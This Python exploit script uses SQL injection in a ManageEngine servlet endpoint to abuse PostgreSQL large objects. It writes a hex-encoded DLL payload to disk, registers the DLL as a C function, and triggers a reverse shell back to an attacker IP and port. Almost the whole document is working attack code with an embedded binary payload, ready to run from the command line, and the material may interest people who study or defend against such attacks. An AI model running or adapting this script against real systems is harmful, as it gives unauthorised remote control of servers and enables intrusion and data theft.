#!/usr/bin/env python3

import requests
import argparse
import sys

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

"""
Note: Working with large objects only works on the DBA level, so non-administrative users would not have the required permissionsfor these actions.

Example usage:
/usr/bin/python3 pg_lo_injection_rce.py manageengine:8443 192.168.45.233 4444
"""


# Hex-encoded reverse shell DLL (UDF payload)
UDF_HEX = "562500000100000003000000030000003825000044250000502500000010000020100000101000005f2500006d2500007a250000000001000200617761652e646c6c0050675f6d616769635f66756e6300636f6e6e6563745f6261636b0070675f66696e666f5f636f6e6e6563745f6261636b008c2600000000000000000000d426000084200000082600000000000000000000f4260000002000005026000000000000000000001e270000482000004026000000000000000000006e27000038200000682600000000000000000000262800006020000000000000000000000000000000000000000000005829000042290000e2260000f6280000e0280000c6280000aa28000096280000822800006428000048280000262900000c290000000000004a270000542700002a2700000000000009000080102700000b0000807300008002270000000000009a2700008c2700008027000004280000e8270000c62700001c280000ac27000000000000ba260000b02600009c260000000000009a1370675f6465746f6173745f646174756d00000118746578746f757400dd0144697265637446756e6374696f6e43616c6c31436f6c6c00706f7374677265732e6578650000df0043726561746550726f636573734100004b45524e454c33322e646c6c00005600575341536f636b65744100002000575341436f6e6e65637400005753325f33322e646c6c000025005f5f7374645f747970655f696e666f5f64657374726f795f6c697374000048006d656d736574000035005f6578636570745f68616e646c6572345f636f6d6d6f6e00564352554e54494d453134302e646c6c000038005f696e69747465726d0039005f696e69747465726d5f650041005f7365685f66696c7465725f646c6c0019005f636f6e6669677572655f6e6172726f775f61726776000035005f696e697469616c697a655f6e6172726f775f656e7669726f6e6d656e74000036005f696e697469616c697a655f6f6e657869745f7461626c65000024005f657865637574655f6f6e657869745f7461626c650017005f636578697400006170692d6d732d77696e2d6372742d72756e74696d652d6c312d312d302e646c6c00a505556e68616e646c6564457863657074696f6e46696c74657200006505536574556e68616e646c6564457863657074696f6e46696c74657200150247657443757272656e7450726f636573730084055465726d696e61746550726f6365737300008103497350726f636573736f724665617475726550726573656e740046045175657279506572666f726d616e6365436f756e74657200160247657443757272656e7450726f636573734964001a0247657443757272656e7454687265616449640000e50247657453797374656d54696d65417346696c6554696d65001c0144697361626c655468726561644c69627261727943616c6c73005e03496e697469616c697a65534c69737448656164007a034973446562756767657250726573656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004ee640bbb119bf44ffffffffc010000013011302530303042304a305530603066306f3078307e30883097309d30a230a830b130bb30c430ce30d730dc30e130f230f930fe3004310f317431a331b331d431d931f231f731043251326e32783286329832b732f5320733c133f43342344b3456345d347d34833489348f3495349b34a234a934b034b734be34c534cc34d434dc34e434f034f934fe3404350e3518352835383548355135723581358a359735ae35c935f135f9350b361736233629362f363b364136bb367e37af37e5370e381d3830383c384c385d3873388a389f38a638ac38be38c838263933395739353a553a5f3a7a3a833a883aae3ab33ad83ae13afe3a4b3b503b633b713b8c3b973b2b3c343c3c3c783c8c3c933cc93cd23cdb3ce93cf23c053d103d163d1c3d223d283d2e3d343d3a3d403d463d4c3d523d000000200000200000009430c430c830ac31b031b831a834c834e434e834043508350000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"  # DLL in HEX
LOID = 1337

def log(msg):
    print(f"[+] {msg}")

def make_request(url_template, sql):
    try:
        log(f"[*] Executing query (truncated): {sql[:80]}")
        response = requests.get(url_template % sql, verify=False, timeout=10)
        if response.status_code != 200:
            log(f"[!] Warning: HTTP {response.status_code}")
        return response
    except requests.RequestException as e:
        log(f"[!] HTTP Request failed: {e}")
        return None

def delete_lo(url, loid):
    log("Deleting existing LO...")
    sql = f"SELECT lo_unlink({loid})"
    make_request(url, sql)

def create_lo(url, loid):
    log("Creating LO for UDF injection...")
    sql = f"SELECT lo_import($$C:\\windows\\win.ini$$,{loid})"
    make_request(url, sql)

def inject_udf(url, loid, udf_hex):
    log(f"Injecting payload of length {len(udf_hex)} into LO...")
    chunk_size = 4096
    for i in range((len(udf_hex) + chunk_size - 1) // chunk_size):
        chunk = udf_hex[i * chunk_size : (i + 1) * chunk_size]
        if i == 0:
            sql = (
                f"UPDATE PG_LARGEOBJECT SET data=decode($${chunk}$$, $$hex$$) "
                f"WHERE loid={loid} AND pageno={i}"
            )
        else:
            sql = (
                f"INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES "
                f"({loid}, {i}, decode($${chunk}$$, $$hex$$))"
            )
        make_request(url, sql)

def export_udf(url, loid):
    log("Exporting UDF library to filesystem...")
    sql = f"SELECT lo_export({loid}, $$C:\\Users\\Public\\rev_shell.dll$$)"
    make_request(url, sql)

def create_udf_func(url):
    log("Creating SQL function from DLL...")
    sql = (
        "CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS "
        "$$C:\\Users\\Public\\rev_shell.dll$$, $$connect_back$$ LANGUAGE C STRICT"
    )
    make_request(url, sql)

def trigger_udf(url, ip, port):
    log("Triggering reverse shell...")
    sql = f"SELECT rev_shell($${ip}$$, {int(port)})"
    make_request(url, sql)

def main():
    parser = argparse.ArgumentParser(
        description="Exploit SQL injection to load UDF DLL and trigger reverse shell"
    )
    parser.add_argument("target", help="Target IP and port (e.g. 10.10.10.10:8443)")
    parser.add_argument("attacker_ip", help="Attacker IP to connect back to")
    parser.add_argument("port", type=int, help="Port for reverse shell connection")

    args = parser.parse_args()

    # Format the vulnerable URL
    sqli_url = f"https://{args.target}/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--"

    log(f"Target URL: {args.target}")
    log("Beginning exploitation sequence...")

    try:
        delete_lo(sqli_url, LOID)
        create_lo(sqli_url, LOID)
        inject_udf(sqli_url, LOID, UDF_HEX)
        export_udf(sqli_url, LOID)
        create_udf_func(sqli_url)
        trigger_udf(sqli_url, args.attacker_ip, args.port)
    except Exception as e:
        log(f"[!] Exploitation failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Script interrupted by user.")
        sys.exit(1)
